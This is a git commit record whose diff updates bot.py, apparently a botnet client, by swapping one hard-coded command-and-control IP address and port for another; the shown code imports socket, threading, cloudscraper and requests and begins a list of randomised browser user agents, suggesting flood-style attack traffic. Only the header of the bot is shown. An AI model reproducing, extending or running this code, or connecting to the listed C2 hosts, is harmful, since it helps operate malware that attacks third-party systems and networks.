4cf82bf1f7062651d591a0b732f23e0b5244bd82
Error201NotExist <error201notexist@gmail.com>
2025-09-18 21:26:42 +0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,7 +1,7 @@
 import socket, threading, time, random, cloudscraper, requests
 
-C2_ADDRESS  = "194.213.18.204"
-C2_PORT     = 35739
+C2_ADDRESS  = "91.236.230.6"
+C2_PORT     = 37407
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
